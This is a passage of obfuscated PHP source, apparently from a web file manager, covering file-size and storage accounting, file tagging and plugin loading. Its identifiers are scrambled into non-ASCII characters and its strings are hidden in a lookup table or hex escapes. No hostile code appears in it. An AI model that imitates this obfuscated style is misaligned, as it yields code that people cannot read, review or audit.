$this->where(array($Ò·Ğ¶ß[402] => $¦»—Ë¶¯))->find(); self::$cacheSourceInfo[$ç¶®ßŞƒ] = $¦”ê‡˜ô; return self::$cacheSourceInfo[$ç¶®ßŞƒ]; } public function sourceCacheClear($äÀÕ©¡¨ = false) { self::cacheClear($äÀÕ©¡¨); } public static function cacheClear($³öš««¹ = false) { $Äü¤ÑÔ =& $_SERVER[ñˆ‹ß¿÷]; if ($³öš««¹ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Äü¤ÑÔ[460] . $³öš««¹]); unset(self::$cachePathInfoMore[$³öš««¹]); unset(self::$cachePathInfo[$Äü¤ÑÔ[2133] . $³öš««¹]); unset(self::$cachePathInfo[$Äü¤ÑÔ[2134] . $³öš««¹]); } public function metaSet($—çÜî¡®, $Ï¼ÁŒ¦ü = null, $ØÒ´Íé = null) { $°‡ÒÍİë = parent::metaSet($—çÜî¡®, $Ï¼ÁŒ¦ü, $ØÒ´Íé); if ($°‡ÒÍİë) { $this->sourceCacheClear($—çÜî¡®); } return $°‡ÒÍİë; } public function pathInfoByPath($µĞ×»ß, $œÜ”ÈÔ¤) { $¨ ß¾„¼ =& $_SERVER[ñˆ‹ß¿÷]; $Ëê ƒ—½ = !$œÜ”ÈÔ¤ ? array() : explode($¨ ß¾„¼[8], trim($œÜ”ÈÔ¤, $¨ ß¾„¼[8])); $·éµ£ôı = $µĞ×»ß; foreach ($Ëê ƒ—½ as $áßî¬ˆî) { $ë‹ş³› = array($¨ ß¾„¼[432] => $·éµ£ôı, $¨ ß¾„¼[32] => $áßî¬ˆî); $Ÿãëåò = $this->where($ë‹ş³›)->select(); if (!$Ÿãëåò) { return !1; } $Ÿãëåò = array_sort_by($Ÿãëåò, $¨ ß¾„¼[431]); $·éµ£ôı = $Ÿãëåò[0][$¨ ß¾„¼[402]]; } return $this->pathInfo($·éµ£ôı, !0); } protected function updateModifyTime($ê¯¾¡¸¾) { $ì¨û‚Öé =& $_SERVER[ñˆ‹ß¿÷]; $¡øâî­Ğ = defined($ì¨û‚Öé[475]) ? USER_ID : $ì¨û‚Öé[197]; if (!$ê¯¾¡¸¾) { return; } if (!is_array($ê¯¾¡¸¾)) { $ê¯¾¡¸¾ = array($ê¯¾¡¸¾); } foreach ($ê¯¾¡¸¾ as $ìñØçÊÈ => $æÓù„·¨) { $ê¯¾¡¸¾[$ìñØçÊÈ] = intval($æÓù„·¨); $this->sourceCacheClear($æÓù„·¨); } $¨Æªƒ’ = array($ì¨û‚Öé[402] => array($ì¨û‚Öé[7], $ê¯¾¡¸¾)); $ƒ¨ÅÅóæ = array($ì¨û‚Öé[589] => $¡øâî­Ğ, $ì¨û‚Öé[424] => time()); $this->where($¨Æªƒ’)->save($ƒ¨ÅÅóæ); } public function folderSizeReset($ØÑ„¨¬, $ŠÙóáÄ® = false) { $ÌÒƒÛ =& $_SERVER[ñˆ‹ß¿÷]; if ($this->statusIgnoreResetSpace) { return; } $¿‘Š‰–ø = $this->sourceInfo($ØÑ„¨¬); $ñı¦Ğ¦è = $ÌÒƒÛ[2135] . $ØÑ„¨¬; CacheLock::lock($ñı¦Ğ¦è, 20); if ($ŠÙóáÄ® === !1) { $this->sourceCacheClear($ØÑ„¨¬); $¿‘Š‰–ø = $this->sourceInfo($ØÑ„¨¬); $Šº¡Ãµ = array($ÌÒƒÛ[401] => $ØÑ„¨¬, $ÌÒƒÛ[430] => 0); $¤é¯İ­± = $this->where($Šº¡Ãµ)->sum($ÌÒƒÛ[76]); $ŠÙóáÄ® = intval($¤é¯İ­±) - intval($¿‘Š‰–ø[$ÌÒƒÛ[76]]); } if ($ŠÙóáÄ® == 0) { return CacheLock::unlock($ñı¦Ğ¦è); } $¿¥ä…† = $this->parentLevelArray($¿‘Š‰–ø[$ÌÒƒÛ[521]]); if (!$¿¥ä…†) { $¿¥ä…† = array(); } $¿¥ä…†[] = $¿‘Š‰–ø[$ÌÒƒÛ[402]]; $Šº¡Ãµ = array($ÌÒƒÛ[402] => array($ÌÒƒÛ[418], $¿¥ä…†)); if ($ŠÙóáÄ® < 0) { $Šº¡Ãµ[$ÌÒƒÛ[76]] = array($ÌÒƒÛ[1022], abs($ŠÙóáÄ®)); } $this->where($Šº¡Ãµ)->setAdd($ÌÒƒÛ[76], $ŠÙóáÄ®); CacheLock::unlock($ñı¦Ğ¦è); $Ä–¯¦³„ = $ÌÒƒÛ[2136] . $¿‘Š‰–ø[$ÌÒƒÛ[411]] . $ÌÒƒÛ[4] . $¿‘Š‰–ø[$ÌÒƒÛ[505]]; $ğõ¯ñ² = array($¿‘Š‰–ø[$ÌÒƒÛ[411]], $¿‘Š‰–ø[$ÌÒƒÛ[505]]); TaskRun::timeLimitCall($Ä–¯¦³„, $ÌÒƒÛ[2137], $ğõ¯ñ², 1.5); } public function folderSizeResetChildren($–èİıï‡) { $¶¦‡Š¾ =& $_SERVER[ñˆ‹ß¿÷]; $this->sourceCacheClear($–èİıï‡); $«ÆÙ“ÄÄ = $this->sourceInfo($–èİıï‡); $¼ÑôáŠ = array($¶¦‡Š¾[583] => 1, $¶¦‡Š¾[587] => $«ÆÙ“ÄÄ[$¶¦‡Š¾[505]], $¶¦‡Š¾[590] => array($¶¦‡Š¾[550], $«ÆÙ“ÄÄ[$¶¦‡Š¾[521]] . $–èİıï‡ . $¶¦‡Š¾[551])); $˜»¶óÖá = $¶¦‡Š¾[2138]; $½……¡µ = $this->field($˜»¶óÖá)->where($¼ÑôáŠ)->select(); $¼ÑôáŠ[$¶¦‡Š¾[410]] = 0; $ÖÁå°‚º = $this->field($˜»¶óÖá)->where($¼ÑôáŠ)->select(); if (!$ÖÁå°‚º) { return; } $½……¡µ[] = $«ÆÙ“ÄÄ; $½……¡µ = array_to_keyvalue($½……¡µ, $¶¦‡Š¾[402]); foreach ($½……¡µ as $öåâ§³ì => $úÜ¤…Î) { $½……¡µ[$öåâ§³ì][$¶¦‡Š¾[2139]] = $½……¡µ[$öåâ§³ì][$¶¦‡Š¾[76]]; $½……¡µ[$öåâ§³ì][$¶¦‡Š¾[76]] = 0; } foreach ($ÖÁå°‚º as $úÜ¤…Î) { $´ÕÛ · = $úÜ¤…Î[$¶¦‡Š¾[432]] . $¶¦‡Š¾[12]; if (!isset($½……¡µ[$´ÕÛ ·])) { continue; } if ($úÜ¤…Î[$¶¦‡Š¾[431]] == $½……¡µ[$´ÕÛ ·][$¶¦‡Š¾[431]]) { $½……¡µ[$´ÕÛ ·][$¶¦‡Š¾[76]] += $úÜ¤…Î[$¶¦‡Š¾[76]]; } } foreach ($½……¡µ as $úÜ¤…Î) { $’»ã = $this->parentLevelArray($úÜ¤…Î[$¶¦‡Š¾[521]]); foreach ($’»ã as $´ÕÛ ·) { $´ÕÛ · = $´ÕÛ · . $¶¦‡Š¾[12]; if (!isset($½……¡µ[$´ÕÛ ·])) { continue; } if ($úÜ¤…Î[$¶¦‡Š¾[431]] == $½……¡µ[$´ÕÛ ·][$¶¦‡Š¾[431]]) { $½……¡µ[$´ÕÛ ·][$¶¦‡Š¾[76]] += $úÜ¤…Î[$¶¦‡Š¾[76]]; } } } $ë³ÎªÚó = array(); foreach ($½……¡µ as $úÜ¤…Î) { if ($úÜ¤…Î[$¶¦‡Š¾[76]] == $úÜ¤…Î[$¶¦‡Š¾[2139]]) { continue; } $ë³ÎªÚó[] = array($¶¦‡Š¾[402], $úÜ¤…Î[$¶¦‡Š¾[402]], $¶¦‡Š¾[76], $úÜ¤…Î[$¶¦‡Š¾[76]]); } $this->saveAll($ë³ÎªÚó); } public function userSpaceReset($±ÏğÍşö = false) { $ó´ª‘¨ë =& $_SERVER[ñˆ‹ß¿÷]; $³ÏŸÜÈç = $this->where(array($ó´ª‘¨ë[411] => self::TYPE_USER, $ó´ª‘¨ë[505] => $±ÏğÍşö, $ó´ª‘¨ë[410] => 0))->sum($ó´ª‘¨ë[76]); $³ÏŸÜÈç = !$³ÏŸÜÈç || $³ÏŸÜÈç <= 0 ? 0 : $³ÏŸÜÈç; Model($ó´ª‘¨ë[513])->userEdit($±ÏğÍşö, array($ó´ª‘¨ë[1825] => $³ÏŸÜÈç)); } public function targetSpaceUpdate($ëÌ€ÍÌÚ, $—º·ÓÒš) { $ùıøšë± =& $_SERVER[ñˆ‹ß¿÷]; if (!$—º·ÓÒš) { return; } if (!in_array($ëÌ€ÍÌÚ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $óĞÅ›Æ¦ = $this->targetSpaceSize($ëÌ€ÍÌÚ, $—º·ÓÒš); if ($ëÌ€ÍÌÚ == self::TYPE_USER) { Model($ùıøšë±[513])->userEdit($—º·ÓÒš, array($ùıøšë±[1825] => $óĞÅ›Æ¦)); } else { if ($ëÌ€ÍÌÚ == self::TYPE_GROUP) { Model($ùıøšë±[522])->groupEdit($—º·ÓÒš, array($ùıøšë±[1825] => $óĞÅ›Æ¦)); } } } public function targetSpaceSize($¬¡Ø…•Ø, $Ñ¹Š€´Ä) { $•œíŒ€¡ =& $_SERVER[ñˆ‹ß¿÷]; $¶´Ñ€ñŠ = 0; $¬üº—¯Ó = $this->sourceRoot($¬¡Ø…•Ø, $Ñ¹Š€´Ä, !0); foreach ($¬üº—¯Ó as $Ñßì¦ÁÆ) { if (!$Ñßì¦ÁÆ) { continue; } $¶´Ñ€ñŠ += floatval($Ñßì¦ÁÆ[$•œíŒ€¡[76]]); $¿áœ™ç¿ = array($•œíŒ€¡[590] => array($•œíŒ€¡[550], $•œíŒ€¡[531] . $Ñßì¦ÁÆ[$•œíŒ€¡[402]] . $•œíŒ€¡[551])); $Á–”ìâŠ = Model($•œíŒ€¡[429])->field($•œíŒ€¡[417])->where($¿áœ™ç¿)->select(); $Á–”ìâŠ = array_to_keyvalue($Á–”ìâŠ, $•œíŒ€¡[12], $•œíŒ€¡[402]); $Á–”ìâŠ = array_unique(array_filter($Á–”ìâŠ)); if ($Á–”ìâŠ) { $¿áœ™ç¿ = array($•œíŒ€¡[417] => array($•œíŒ€¡[418], $Á–”ìâŠ)); $¶´Ñ€ñŠ += floatval($this->where($¿áœ™ç¿)->sum($•œíŒ€¡[76])); } } $¶´Ñ€ñŠ = !$¶´Ñ€ñŠ || $¶´Ñ€ñŠ <= 0 ? 0 : $¶´Ñ€ñŠ; return $¶´Ñ€ñŠ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Ò´¯¸Ğš) { return $this->fileTypeProfile($Ò´¯¸Ğš, SourceModel::TYPE_USER); } public function groupFileTypeProfile($›ÑœÜÕ÷) { return $this->fileTypeProfile($›ÑœÜÕ÷, SourceModel::TYPE_GROUP); } private function fileTypeProfile($›ó–Ö²ø, $öôÄšéÜ) { $—°–úôá =& $_SERVER[ñˆ‹ß¿÷]; $´¯ª±¤ı = $—°–úôá[2140] . $›ó–Ö²ø . $—°–úôá[11] . $öôÄšéÜ; $•»˜é = Cache::get($´¯ª±¤ı); if ($•»˜é) { return $•»˜é; } $¿È³»÷¾ = array($—°–úôá[583] => 0); if ($›ó–Ö²ø != !1) { $¿È³»÷¾[$—°–úôá[505]] = $›ó–Ö²ø; $¿È³»÷¾[$—°–úôá[411]] = $öôÄšéÜ; } $Î£¬»ç = array(); $Î£¬»ç[$—°–úôá[2141]] = array($—°–úôá[2142] => LNG($—°–úôá[2141]), $—°–úôá[2143] => $this->where($¿È³»÷¾)->count(), $—°–úôá[585] => $this->where($¿È³»÷¾)->sum($—°–úôá[76])); $¦­Ãêæ = KodIO::fileTypeList(); foreach ($¦­Ãêæ as $†á‹ŒÅ => $‘áà••ğ) { $¿È³»÷¾[$—°–úôá[412]] = $this->fileTypeWhere($†á‹ŒÅ); $Î£¬»ç[$†á‹ŒÅ] = array($—°–úôá[2142] => $‘áà••ğ[$—°–úôá[32]], $—°–úôá[2143] => $this->where($¿È³»÷¾)->count(), $—°–úôá[585] => $this->where($¿È³»÷¾)->sum($—°–úôá[76])); } Cache::set($´¯ª±¤ı, $Î£¬»ç, 1200); return $Î£¬»ç; } public function fileNameExist($Á£¸¬©º, $ÂøÔ—šÌ) { $ÇÓåôì– =& $_SERVER[ñˆ‹ß¿÷]; $®‘²© = $this->where(array($ÇÓåôì–[432] => $Á£¸¬©º, $ÇÓåôì–[32] => $ÂøÔ—šÌ, $ÇÓåôì–[431] => 0))->find(); return is_array($®‘²©) ? $®‘²©[$ÇÓåôì–[402]] : !1; } public function childList($«š—Ëˆó) { $ŸÙÀ•ó‘ =& $_SERVER[ñˆ‹ß¿÷]; $Ã‚š¿¨­ = $ŸÙÀ•ó‘[2118] . $«š—Ëˆó; if (isset(self::$cacheChildList[$Ã‚š¿¨­])) { return self::$cacheChildList[$Ã‚š¿¨­]; } $ŞÂç‰–‡ = array($ŸÙÀ•ó‘[432] => intval($«š—Ëˆó), $ŸÙÀ•ó‘[431] => 0); $ÈÔò‚»Œ = $this->where($ŞÂç‰–‡)->select(); $ÈÔò‚»Œ = $ÈÔò‚»Œ ? $ÈÔò‚»Œ : array(); self::$cacheChildList[$Ã‚š¿¨­] = $ÈÔò‚»Œ; foreach ($ÈÔò‚»Œ as $ëé©Ï¤) { $Ã‚š¿¨­ = $ŸÙÀ•ó‘[460] . $ëé©Ï¤[$ŸÙÀ•ó‘[402]]; self::$cacheSourceInfo[$Ã‚š¿¨­] = $ëé©Ï¤; } return $ÈÔò‚»Œ; } public function fileNameAuto($È—Şä¥, $‘Ï­ù‚Ÿ, $Ô²ÔË¢Ÿ = REPEAT_RENAME, $¯Ù­ÇôÒ = false) { $á¦ÅÏÜ± =& $_SERVER[ñˆ‹ß¿÷]; $¡§ˆÏÒà = get_path_ext($‘Ï­ù‚Ÿ); $«“’ĞŒï = $¡§ˆÏÒà ? basename($‘Ï­ù‚Ÿ, $á¦ÅÏÜ±[10] . $¡§ˆÏÒà) . $á¦ÅÏÜ±[2144] . $¡§ˆÏÒà : $‘Ï­ù‚Ÿ . $á¦ÅÏÜ±[384]; $—îØ•Üµ = array($á¦ÅÏÜ±[432] => $È—Şä¥, $á¦ÅÏÜ±[431] => 0, $á¦ÅÏÜ±[32] => array($á¦ÅÏÜ±[383], $«“’ĞŒï)); $ŞÇÈÒ‡‹ = $this->field($á¦ÅÏÜ±[32])->where($—îØ•Üµ)->select(); $¡§×Ì–‘ = array_to_keyvalue($ŞÇÈÒ‡‹, $á¦ÅÏÜ±[12], $á¦ÅÏÜ±[32]); return $this->fileNameAutoGet($¡§×Ì–‘, $‘Ï­ù‚Ÿ, $Ô²ÔË¢Ÿ, $¯Ù­ÇôÒ); } public function fileNameAutoGet($ÍâŒŠø½, $ı’§å‘ã, $Û„”Û×Ø, $™Õèñ³¯) { $ª£Ù”Ú÷ =& $_SERVER[ñˆ‹ß¿÷]; if ($Û„”Û×Ø == REPEAT_REPLACE || !$ÍâŒŠø½ || !in_array_not_case($ı’§å‘ã, $ÍâŒŠø½) || $™Õèñ³¯ && $Û„”Û×Ø != REPEAT_RENAME_FOLDER) { return $ı’§å‘ã; } if ($Û„”Û×Ø == REPEAT_SKIP) { return !1; } $é¥ùú“® = $ª£Ù”Ú÷[10] . get_path_ext($ı’§å‘ã); $é¥ùú“® = $é¥ùú“® == $ª£Ù”Ú÷[10] || $™Õèñ³¯ ? $ª£Ù”Ú÷[12] : $é¥ùú“®; for ($¡“é¡€Ç = 1; $¡“é¡€Ç <= count($ÍâŒŠø½) + 1; $¡“é¡€Ç++) { $àáÔËÕ = substr($ı’§å‘ã, 0, strlen($ı’§å‘ã) - strlen($é¥ùú“®)); $Ì™Şâ = $àáÔËÕ . "\x28{$¡“é¡€Ç}\x29{$é¥ùú“®}"; if (!in_array_not_case($Ì™Şâ, $ÍâŒŠø½)) { return $Ì™Şâ; } } } } goto fÀ¶ìÑ¬¢; Cé¬ŞÀÒ…: class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\x66\141\x76"; protected function cacheFunctionAlias($Ø°ã¤¼Œ) { $ÂôüÍ¢ =& $_SERVER[ñˆ‹ß¿÷]; return array($ÂôüÍ¢[1945] => array($Ø°ã¤¼Œ[0], $ÂôüÍ¢[1946]), $ÂôüÍ¢[1947] => array($Ø°ã¤¼Œ[0], $ÂôüÍ¢[1948])); } protected function get($’¨ñ„°«) { $üãâ›‘€ =& $_SERVER[ñˆ‹ß¿÷]; $×à¬±²ç = Model($üãâ›‘€[522])->metaGet($’¨ñ„°«, $üãâ›‘€[1949]); $ÊõóÃ = json_decode($×à¬±²ç, !0); return $ÊõóÃ ? $ÊõóÃ : array($üãâ›‘€[1950] => $üãâ›‘€[88], $üãâ›‘€[369] => array()); } protected function set($äŒãÔÂ•, $à¨Êë¾Ë) { $­ÇÄôÀ‚ =& $_SERVER[ñˆ‹ß¿÷]; $à¨Êë¾Ë = $à¨Êë¾Ë ? $à¨Êë¾Ë : array($­ÇÄôÀ‚[1950] => $­ÇÄôÀ‚[88], $­ÇÄôÀ‚[369] => array()); return Model($­ÇÄôÀ‚[522])->metaSet($äŒãÔÂ•, $­ÇÄôÀ‚[1949], json_encode($à¨Êë¾Ë)); } protected function getByTagID($¸¹ïá¬œ, $…æ˜ÛÖÎ) { $Ÿ¢ª¶‹„ =& $_SERVER[ñˆ‹ß¿÷]; if (!$¸¹ïá¬œ || !$…æ˜ÛÖÎ) { return !1; } if (!Model($Ÿ¢ª¶‹„[522])->getInfoSimple($¸¹ïá¬œ)) { return !1; } $šØĞà›Ê = $this->get($¸¹ïá¬œ); if (!$šØĞà›Ê || !isset($šØĞà›Ê[$Ÿ¢ª¶‹„[369]])) { return !1; } $‘½®®ú = array_find_by_field($šØĞà›Ê[$Ÿ¢ª¶‹„[369]], $Ÿ¢ª¶‹„[399], $…æ˜ÛÖÎ); return is_array($‘½®®ú) ? $‘½®®ú : !1; } public function listSource($Ê©¶Û¾, $Á†å‘) { $ğ¶‘®ó¿ =& $_SERVER[ñˆ‹ß¿÷]; if ($Á†å‘ && !is_array($Á†å‘)) { $Á†å‘ = array($Á†å‘); } $¡ºæı†¾ = $this->listData($Ê©¶Û¾); $É€¾‡·¡ = array(); foreach ($¡ºæı†¾ as $ªÍˆÆ¯) { $¸­„°×è = $ªÍˆÆ¯[$ğ¶‘®ó¿[84]]; if (!$¸­„°×è) { continue; } if (!isset($É€¾‡·¡[$¸­„°×è])) { $É€¾‡·¡[$¸­„°×è] = array(); } $É€¾‡·¡[$¸­„°×è][] = $ªÍˆÆ¯[$ğ¶‘®ó¿[426]]; } $ËóÈ‘‚Ğ = array(); foreach ($É€¾‡·¡ as $‡«±ÂŸñ => $Ë¾¿Âàâ) { $ÊÂæ—Î = !0; if (!$Á†å‘) { $ËóÈ‘‚Ğ[] = $‡«±ÂŸñ; continue; } foreach ($Á†å‘ as $É“ğ·) { if (!in_array($É“ğ·, $Ë¾¿Âàâ)) { $ÊÂæ—Î = !1; break; } } if ($ÊÂæ—Î) { $ËóÈ‘‚Ğ[] = $‡«±ÂŸñ; } } if (!$ËóÈ‘‚Ğ) { return array(); } $îÛœ›Æî = array($ğ¶‘®ó¿[417] => array($ğ¶‘®ó¿[418], $ËóÈ‘‚Ğ), $ğ¶‘®ó¿[505] => $Ê©¶Û¾, $ğ¶‘®ó¿[411] => SourceModel::TYPE_GROUP); $üùâÊ„… = Model($ğ¶‘®ó¿[1334])->listSource($îÛœ›Æî); if (!$üùâÊ„… || count($ËóÈ‘‚Ğ) == $üùâÊ„…[$ğ¶‘®ó¿[366]][$ğ¶‘®ó¿[367]]) { return $üùâÊ„…; } $Ç…Û = array(); $³ŒÛ†ÓÒ = array_to_keyvalue($üùâÊ„…[$ğ¶‘®ó¿[82]], $ğ¶‘®ó¿[12], $ğ¶‘®ó¿[402]); $É³ä…í = array_to_keyvalue($üùâÊ„…[$ğ¶‘®ó¿[83]], $ğ¶‘®ó¿[12], $ğ¶‘®ó¿[402]); $†¦–®³Ş = array_merge($É³ä…í, $³ŒÛ†ÓÒ); foreach ($ËóÈ‘‚Ğ as $¸­„°×è) { if (!in_array($¸­„°×è, $†¦–®³Ş)) { $Ç…Û[] = $¸­„°×è; } } if ($Ç…Û) { $this->removeBySource($Ê©¶Û¾, $Ç…Û); } return $üùâÊ„…; } protected function listData($ƒúÃâœ) { $¨ì·ŸéÛ =& $_SERVER[ñˆ‹ß¿÷]; $ŠÌ‘¾Ûç = array($¨ì·ŸéÛ[1655] => 0, $¨ì·ŸéÛ[484] => array($¨ì·ŸéÛ[1951], 0), $¨ì·ŸéÛ[422] => $¨ì·ŸéÛ[1952] . $ƒúÃâœ); $•‰âµµÒ = $¨ì·ŸéÛ[1953]; $­Òˆ–Ëš = $this->field($•‰âµµÒ)->where($ŠÌ‘¾Ûç)->order($¨ì·ŸéÛ[1954])->select(); return $­Òˆ–Ëš ? $­Òˆ–Ëš : array(); } protected function addToTag($˜úÂÁ£, $¢ØÍ²à, $‡·û˜ˆû) { $ìÁ¬ö£² =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->getByTagID($˜úÂÁ£, $‡·û˜ˆû) || !$¢ØÍ²à) { return !1; } if (!Model($ìÁ¬ö£²[832])->pathInfo($¢ØÍ²à)) { return !1; } $œß®’«Û = array($ìÁ¬ö£²[1655] => 0, $ìÁ¬ö£²[484] => $‡·û˜ˆû, $ìÁ¬ö£²[421] => $¢ØÍ²à, $ìÁ¬ö£²[422] => $ìÁ¬ö£²[1955] . $˜úÂÁ£, $ìÁ¬ö£²[420] => $ìÁ¬ö£²[12], $ìÁ¬ö£²[1840] => 0); if ($this->where($œß®’«Û)->find()) { return !1; } return $this->add($œß®’«Û); } protected function removeFromTag($ÕÖ´óİ, $Î†Ë–†•, $¡§ëœ˜¨) { $¶ğø¡¡ =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->getByTagID($ÕÖ´óİ, $¡§ëœ˜¨) || !$Î†Ë–†•) { return !1; } if (is_array($Î†Ë–†•)) { $Î†Ë–†• = array($¶ğø¡¡[7], $Î†Ë–†•); } $ŸÓ¬ôî“ = array($¶ğø¡¡[1655] => 0, $¶ğø¡¡[484] => $¡§ëœ˜¨, $¶ğø¡¡[422] => $¶ğø¡¡[1955] . $ÕÖ´óİ, $¶ğø¡¡[421] => $Î†Ë–†•); return $this->where($ŸÓ¬ôî“)->delete(); } protected function removeByTag($˜äğëÎ¥, $­º ³ã§) { $÷‰ÒÜ²Ó =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->getByTagID($˜äğëÎ¥, $­º ³ã§)) { return !1; } $İ€ÉÎí = array($÷‰ÒÜ²Ó[1655] => 0, $÷‰ÒÜ²Ó[484] => $­º ³ã§, $÷‰ÒÜ²Ó[422] => $÷‰ÒÜ²Ó[1955] . $˜äğëÎ¥); return $this->where($İ€ÉÎí)->delete(); } protected function removeBySource($ƒ‚××ÂÒ, $øƒ‰ÁÕÖ) { $¦ÈÎãÅÕ =& $_SERVER[ñˆ‹ß¿÷]; if (!$ƒ‚××ÂÒ || !$øƒ‰ÁÕÖ) { return !1; } if (is_array($øƒ‰ÁÕÖ)) { $øƒ‰ÁÕÖ = array($¦ÈÎãÅÕ[7], $øƒ‰ÁÕÖ); } $œ˜İòè¡ = array($¦ÈÎãÅÕ[1655] => 0, $¦ÈÎãÅÕ[421] => $øƒ‰ÁÕÖ, $¦ÈÎãÅÕ[484] => array($¦ÈÎãÅÕ[1021], 0), $¦ÈÎãÅÕ[422] => $¦ÈÎãÅÕ[1955] . $ƒ‚××ÂÒ); return $this->where($œ˜İòè¡)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\x2e\x70\154\x75\147\151\x6e\x4c\151\163\x74"; public $field = array("\156\141\155\x65", "\x73\x74\x61\x74\165\163", "\162\145\147\x69\x65\x73\x74", "\x63\157\x6e\146\x69\147"); public function loadList($›ôª°À = false) { $Û”ë¾àÃ = array_to_keyvalue($this->listData(), $_SERVER[ñˆ‹ß¿÷][32]); if ($›ôª°À) { return $Û”ë¾àÃ[$›ôª°À]; } return $Û”ë¾àÃ; } public function init() { $¿’‘Æ´ò =& $_SERVER[ñˆ‹ß¿÷]; Hook::trigger($¿’‘Æ´ò[1956]); $ÇÏÑÉàû = $this->loadPluginList(); foreach ($ÇÏÑÉàû as $£¢ÎÏ„¿ => $ºÜÆ•î) { $Äùşøƒ¥ = $this->appAllow($£¢ÎÏ„¿, $ºÜÆ•î); if (!$Äùşøƒ¥) { continue; } foreach ($ºÜÆ•î[$¿’‘Æ´ò[1957]] as $“‘óøüõ => $äöÁµ©å) { Hook::bind($“‘óøüõ, $äöÁµ©å); } } Hook::trigger($¿’‘Æ´ò[1958]); Hook::trigger(ACTION); } public function appAllow($„ÊÈáÄò, $Ñ‡©ô’, $çÀõÉ = true) { $¿¥‘ËØ¬ =& $_SERVER[ñˆ‹ß¿÷]; $ü½µ­’¼ = PLUGIN_DIR . $„ÊÈáÄò . $¿¥‘ËØ¬[1959]; if (!is_array($Ñ‡©ô’) || !is_array($Ñ‡©ô’[$¿¥‘ËØ¬[1957]]) || $Ñ‡©ô’[$¿¥‘ËØ¬[757]] != 1 || !is_file($ü½µ­’¼)) { return !1; } if ($GLOBALS[$¿¥‘ËØ¬[503]] == 1) { if ($GLOBALS[$¿¥‘ËØ¬[6]][$¿¥‘ËØ¬[1960]] || !$GLOBALS[$¿¥‘ËØ¬[6]][$¿¥‘ËØ¬[1961]]) { return !0; } $ßøœ©£µ = explode($¿¥‘ËØ¬[50], strtolower($GLOBALS[$¿¥‘ËØ¬[6]][$¿¥‘ËØ¬[1961]])); return in_array(strtolower($„ÊÈáÄò), $ßøœ©£µ) ? !1 : !0; } if ($çÀõÉ && !Action($¿¥‘ËØ¬[1962])->checkAuth($„ÊÈáÄò)) { return !1; } return !0; } public function unInstall($¡¹¦íÊ³) { $ÈÄé¢±¸ =& $_SERVER[ñˆ‹ß¿÷]; $àğ¬·‹¯ = $this->loadList($¡¹¦íÊ³); if (file_exists(PLUGIN_DIR . $¡¹¦íÊ³)) { Hook::apply($¡¹¦íÊ³ . $ÈÄé¢±¸[1963]); } $this->remove($àğ¬·‹¯[$ÈÄé¢±¸[399]]); } public function changeStatus($è’×À–Ü, $¬ÙæÑ»¥) { $ëŞùîÓ™ =& $_SERVER[ñˆ‹ß¿÷]; $Ğ¢´ˆ¥„ = $this->loadList($è’×À–Ü); if ($¬ÙæÑ»¥) { Hook::apply($è’×À–Ü . $ëŞùîÓ™[1964]); } $this->update($Ğ¢´ˆ¥„[$ëŞùîÓ™[399]], array($ëŞùîÓ™[1965] => $¬ÙæÑ»¥)); } public function appRegist($–Ó´ñŒ, $Æ–ìğ Ş) { $Ï¯ÁöØ =& $_SERVER[ñˆ‹ß¿÷]; $‡àÖŞì· = $this->loadList($–Ó´ñŒ); if ($‡àÖŞì·) { $this->update($‡àÖŞì·[$Ï¯ÁöØ[399]], array($Ï¯ÁöØ[1957] => $Æ–ìğ Ş)); } else { $½ÏÛ¿ŒŒ = array($Ï¯ÁöØ[32] => $–Ó´ñŒ, $Ï¯ÁöØ[1957] => $Æ–ìğ Ş, $Ï¯ÁöØ[757] => 0, $Ï¯ÁöØ[6] => $this->getConfigDefault($–Ó´ñŒ)); $this->insert($½ÏÛ¿ŒŒ); } } public function getConfigDefault($Î¼¿±Ä÷) { $÷ïûƒ¸‚ =& $_SERVER[ñˆ‹ß¿÷]; $éÑß—ô = array(); $·ÕÚÒáâ = $this->getPackageJson($Î¼¿±Ä÷); if (!$·ÕÚÒáâ && is_array($·ÕÚÒáâ[$÷ïûƒ¸‚[1966]])) { return $éÑß—ô; } foreach ($·ÕÚÒáâ[$÷ïûƒ¸‚[1966]] as $Ğ¼êÅí¤ => $‰¢Å‘²) { if (!isset($‰¢Å‘²[$÷ïûƒ¸‚[374]]) || isset($éÑß—ô[$Ğ¼êÅí¤])) { continue; } $éÑß—ô[$Ğ¼êÅí¤] = $‰¢Å‘²[$÷ïûƒ¸‚[374]]; } return $éÑß—ô; } public function getPackageJson($¥¦¼´³î) { return Hook::apply($¥¦¼´³î . $_SERVER[ñˆ‹ß¿÷][1967]); } public function getConfig($ŞæÃ†èÛ, $Ñ°ß¹¹  = false) { $¾Âéİë­ =& $_SERVER[ñˆ‹ß¿÷]; $ÚÜñ×¢È = array(); $‡°˜«Íï = $this->loadList($ŞæÃ†èÛ); if ($‡°˜«Íï && is_array($‡°˜«Íï[$¾Âéİë­[6]])) { $ÚÜñ×¢È = $‡°˜«Íï[$¾Âéİë­[6]]; } if (!$ÚÜñ×¢È || $Ñ°ß¹¹ ) { $ÚÜñ×¢È = $this->getConfigDefault($ŞæÃ†èÛ); } return $ÚÜñ×¢È; } public function setConfig($Í·’À , $¼¼€òºÌ = false) { $¸åÖå› =& $_SERVER[ñˆ‹ß¿÷]; $Ê¸×Ô— = $this->loadList($Í·’À ); if (!$Ê¸×Ô—) { return !1; } $—’æ®şâ = $Ê¸×Ô—[$¸åÖå›[6]]; if ($¼¼€òºÌ == !1) { $—’æ®şâ = array(); $¼¼€òºÌ = $this->getConfigDefault($Í·’À ); } foreach ($¼¼€òºÌ as $¶•÷ÕÎ• => $’‡Ø¯Èû) { $—’æ®şâ[$¶•÷ÕÎ•] = is_string($’‡Ø¯Èû) ? trim($’‡Ø¯Èû) : $’‡Ø¯Èû; } $this->update($Ê¸×Ô—[$¸åÖå›[399]], array($¸åÖå›[6] => $—’æ®şâ)); } public function viewList() { $˜°’ç‘ =& $_SERVER[ñˆ‹ß¿÷]; $Ö¤èá¥ = $this->loadList(); $this->pluginScan($Ö¤èá¥); 